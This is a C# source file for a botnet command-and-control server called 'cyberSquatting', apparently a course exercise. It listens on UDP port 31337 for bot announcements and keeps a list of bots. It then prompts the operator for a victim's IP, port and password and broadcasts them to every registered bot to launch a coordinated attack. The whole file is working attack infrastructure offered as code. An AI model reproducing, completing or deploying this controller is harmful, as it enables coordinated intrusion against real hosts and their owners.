using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Bot;
using System.Net;
using System.Threading;

namespace CyberSquatting
{
    /// <summary>
    /// This class represents C&C server
    /// </summary>
    public class cyberSquatting
    {
        /// <summary>
        /// fields of C&C server
        /// </summary>
        List<BotData> m_bots = new List<BotData>();
        private UdpClient m_listener;
        private string m_serverName = "cyberSquatting                  ";

        /// <summary>
        /// This method to create udp connection 
        /// </summary>
        public void StartUDP()
        {
            int portToListen = 31337;   
            m_listener = new UdpClient();
            m_listener.EnableBroadcast = true;
            m_listener.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, portToListen);
            m_listener.Client.Bind(groupEP);
            string port, IP;
            Console.WriteLine("Command and control server cyberSquatting active");

            Thread getBot = new Thread(() =>
             {
                 try
                 {
                     while (true)
                     {
                         byte[] recvBuffer = m_listener.Receive(ref groupEP);  // receive bot announcement
                         port = groupEP.Port.ToString();
                         IP = groupEP.Address.ToString();
                         //Console.WriteLine("For Test -------- IP: " + IP);      /// for test purose
                         //Console.WriteLine("For Test -------- port: " + port);  /// for test purose
                         AddBotToMyServer(new BotData(IP, port));
                     }
                 }
                 catch (Exception exception)
                 {
                     Console.WriteLine("Error in server");
                 }
             });

            Thread getVictim = new Thread(() =>
            {
                string _ip, _port, _password;
                try
                {
                    Console.WriteLine("Enter ip of your victim");
                    _ip = Console.ReadLine();

                    Console.WriteLine("Enter port of your victim");
                    _port = Console.ReadLine();

                    Console.WriteLine("Enter password of your victim");
                    _password = Console.ReadLine();

                    AttackVictim(_ip, _port, _password);
                }
                catch (Exception exception)
                {
                    Console.WriteLine("Error in input of server");
                }
            });
            getBot.Start();
            getVictim.Start();
        }

        /// <summary>
        /// Method for attack victim by all bots
        /// </summary>
        /// <param name="ip">ip address of victim</param>
        /// <param name="port">port of victim</param>
        /// <param name="password">password of victim</param>
        private void AttackVictim(string ip, string port, string password)
        {
            lock (m_bots)
            {

                byte[] victimIP, victimPort, victimPassword, serverHack;
                victimIP = IPAddress.Parse(ip).GetAddressBytes();
                short s = Convert.ToInt16(port);
                victimPort = BitConverter.GetBytes(Convert.ToInt16(port)); 
                victimPassword = Encoding.ASCII.GetBytes(password);
                serverHack = Encoding.ASCII.GetBytes(m_serverName);
                lock (m_bots)
                {
                    Console.WriteLine("attacking victim on IP " + ip + ", port " + port + " with " + m_bots.Count + " bots");
                    foreach (BotData botData in m_bots)
                    {
                        BotData tmpBot = botData;
                        UdpClient server = new UdpClient(botData.m_IP, Int16.Parse(botData.m_port));
                        byte[] data = victimIP.Concat(victimPort).Concat(victimPassword).Concat(serverHack).ToArray();
                        server.Send(data, data.Length);
                    }
                }
            }
        }

        /// <summary>
        /// Method to add new bot to data structure 
        /// </summary>
        /// <param name="botData">the data of the new bot</param>
        public void AddBotToMyServer(BotData botData)
        {
            lock (m_bots)
            {
                if (!m_bots.Contains(botData))
                {
                    m_bots.Add(botData);
                }
            }
        }
    }

    /// <summary>
    /// This class represents the data of a bot
    /// </summary>
    public class BotData : IEquatable<BotData>
    {
        public string m_IP { get; set; }
        public string m_port { get; set; }

        public BotData(string ip, string port)
        {
            this.m_IP = ip;
            this.m_port = port;
        }

        public bool Equals(BotData other)
        {
            if (this.m_IP.Equals(other.m_IP) && this.m_port.Equals(other.m_port))
            {
                return true;
            }
            return false;
        }
    }
}
